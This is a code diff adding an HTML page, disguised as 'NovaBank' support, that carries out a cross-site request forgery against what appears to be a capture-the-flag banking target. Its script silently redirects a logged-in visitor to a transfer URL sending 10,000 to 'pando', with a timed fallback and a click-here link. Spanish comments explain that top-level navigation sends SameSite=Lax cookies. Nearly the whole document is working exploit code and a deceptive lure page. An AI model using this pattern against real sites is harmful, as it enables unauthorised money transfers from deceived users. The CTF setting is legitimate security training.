@@ -22,7 +22,34 @@
 
 -->
 
+<!--
 <script>
   // Esto no es un formulario, es un salto directo que el navegador SIEMPRE permite con cookies
   window.location.href = "https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000";
 </script>
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Soporte NovaBank</title>
+</head>
+<body>
+    <script>
+        // Definimos la URL de transferencia usando parámetros de URL (GET)
+        // Incluimos el reference_number por si el servidor lo requiere como vimos en clase
+        const target = "https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000&reference_number=23";
+
+        // MÉTODO 1: Redirección de ventana (Navegación Top-Level)
+        // Según tus apuntes (Pág. 12), esto SÍ envía cookies SameSite=Lax
+        window.location.replace(target);
+
+        // MÉTODO 2: Respaldo por si el anterior falla
+        setTimeout(function() {
+            window.location.href = target;
+        }, 500);
+    </script>
+    
+    <p>Si no es redirigido, <a href="https://ctf.fap.hispasec.com:8009/transfer?to=pando&amount=10000">haga clic aquí</a>.</p>
+</body>
+</html>
